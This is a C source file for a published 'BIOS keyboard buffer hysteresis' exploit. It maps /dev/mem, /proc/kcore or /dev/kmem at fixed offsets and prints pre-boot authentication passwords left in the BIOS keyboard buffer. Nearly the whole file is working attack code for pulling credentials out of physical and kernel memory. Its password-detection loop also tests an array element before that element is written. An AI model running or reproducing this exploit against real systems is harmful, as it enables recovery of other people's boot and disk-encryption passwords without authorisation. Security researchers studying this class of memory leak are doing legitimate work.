/*
*
* BIOS keyboard buffer hysteresis generic userland exploit for *nix.
*
* // Jonathan Brossard - jb@endrazine.com - endrazine@gmail.com
*
* Tested successfully under various Linux, *BSD and Solaris platforms.
*
*
* This code is able to retreive passwords from both /dev devices (a la /dev/mem,
* a raw mapping of the physical memory), and files from pseudo file system /proc (a la kcore,
* which contains kernel memory under the structure of a core file).
*
* Limited support is also provided to handle /dev/kmem under Linux.
*
*/


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <getopt.h>

#include <malloc.h>
#include <sys/mman.h>

/*
* Define default targets files and offsets
*/
#define DEFAULT_DEVICE "/dev/mem"
#define BIOS_BUFFER_ADDRESS_M 0x041e

#define DEFAULT_PROC "/proc/kcore"
#define BIOS_BUFFER_ADDRESS_K 0x141e

#define DEFAULT_KERNEL_MAP "/dev/kmem"
#define KERNEL_BUFFER_ADDRESS 0xC000041E

#define BUFF_LENGTH 255 /* max length for pathnames */

/*
* Display some help
*/
int usage(int argc, char **argv) {

	fprintf(stderr,
		"usage: %s [-h] [--memory-device=<device>] [--pseudo-file=<pseudo file>]\n"
		"\n"
		"--help (or -h)				display this help\n"
		"--memory-device (or -m)		memory device (default: %s)\n"
		"--pseudo-file (or -p)			/proc pseudo file (default: %s)\n"
		"--kernel-device (or -k) *LINUX* *ONLY*	kernel memory device (default: %s)\n"
		"\n",
		argv[0], DEFAULT_DEVICE, DEFAULT_PROC, DEFAULT_KERNEL_MAP);

	exit(-2);
}

/*
* Give some credits
*/
int credits(void) {

	printf("\n  [ BIOS keyboard buffer hysteresis generic userland exploit for *nix. ]\n"
		"  // Jonathan Brossard - jonathan@ivizindia.com - endrazine@gmail.com\n\n"
		"  Tested under several flavours of GNU/Linux, *BSD and Solaris.\n\n"); 

	return 0;
}

int main(int argc, char **argv)
{
	int fd, i=0,j, f;

	char tab[32];
	char tab2[16];

	int c;
	int digit_optind = 0;

	int TARGET_OFFSET;
	char TARGET_FILE[BUFF_LENGTH];

	int device_flag = 0;	/* are we processing a device ? */
	int proc_flag = 0;	/* are we processing a file from /proc pseudo filesystem ? */
	int kernel_flag = 0;	/* are we processing /dev/kmem ? */
	int password_flag = 0;	/* is there a password stored in BIOS memory ? */


	credits();

	if (argc < 2)
		usage(argc, argv);

	/*
	* Command line options parsing
	*/
	while (1) {
		int this_option_optind = optind ? optind : 1;
		int option_index = 0;
		static struct option long_options[] =
		    { 	{"help", 0, 0, 'h'},
			{"memory-device", 2, 0, 'm'},
			{"pseudo-file", 2, 0, 'p'},
			{"kernel-device", 2, 0, 'k'},
			{0, 0, 0, 0} };

		c = getopt_long(argc, argv, "hp::m::k::", long_options,
				&option_index);
		if (c == -1)
			break;

		switch (c) {
		case 'h':
			usage(argc, argv);
			break;

		case 'm':
			device_flag = 1;
			if(optarg != 0) {
				strncpy(TARGET_FILE, optarg, BUFF_LENGTH);
			} else {
				strncpy(TARGET_FILE, DEFAULT_DEVICE, BUFF_LENGTH);
			}
			TARGET_OFFSET = BIOS_BUFFER_ADDRESS_M;
			break;

		case 'p':
			proc_flag = 1;
			if(optarg != 0) {
				strncpy(TARGET_FILE, optarg, BUFF_LENGTH);
			} else {
				strncpy(TARGET_FILE, DEFAULT_PROC, BUFF_LENGTH);
			}
			TARGET_OFFSET = BIOS_BUFFER_ADDRESS_K;
			break;

		case 'k':
			kernel_flag = 1;
			if(optarg != 0) {
				strncpy(TARGET_FILE, optarg, BUFF_LENGTH);
			} else {
				strncpy(TARGET_FILE, DEFAULT_KERNEL_MAP, BUFF_LENGTH);
			}
			TARGET_OFFSET = KERNEL_BUFFER_ADDRESS;
			break;

		default:
			fprintf(stderr, "[!!] unknown option : '%c'\n", c);
			exit(-2);
		}
	}

	/*
	* Read potential password from file
	*/
	if( (device_flag && proc_flag) || (device_flag && kernel_flag) || (kernel_flag && proc_flag) || (!device_flag && !proc_flag && !kernel_flag) )
		usage(argc, argv);


	fd = open(TARGET_FILE, O_RDONLY);
	if (fd == -1) {
		perror("Fatal error in open ");
		exit(-1);
	}

	int PageSize = (int)sysconf(_SC_PAGESIZE);
	if ( PageSize < 0) {
		perror("Fatal error in sysconf ");
	}

	char* map = mmap(0, PageSize, PROT_READ , MAP_SHARED, fd, TARGET_OFFSET & ~0xFFF);	
	if(map == MAP_FAILED) {
		perror("Fatal error in mmap");
		exit(-1);
	}

	memcpy(tab, map + TARGET_OFFSET - (TARGET_OFFSET & ~0xFFF),32);
	
	
	for (j = 0; j < 16; j++) {
		tab2[i] = tab[2 * j];
		i++;
		
		if (tab2[i] <= 0x7e && tab2[i] >= 0x30 )
			password_flag = 1;
	}

	if (password_flag) {
		printf("--[ Password (to the latest pre boot authentication software) : ");
	} else {
		printf("--[ No password found\n\n");
		exit(0);
	}

	for (i = 0; i < 16; i++) {

		/*
		* We might have several passwords concatenated in case of multiple preboot authentication softs
		*/
		if ( i<15 && tab2[i] == 0x0d && tab2[i+1] != 0x0d && tab2[i+1] <= 0x7e && tab2[i+1] >= 0x30 ) {
			printf("\n--[ Password (to a previous authentication software) :");
		} else {
			printf("%c", tab2[i]);
		}
	}

	printf("\n\n");

	/*
	* Clean up...
	*/
	if (munmap(map, PageSize) < 0) {
		perror("Non fatal error in munmap ");
	}
	close(fd);

	return 0;
}
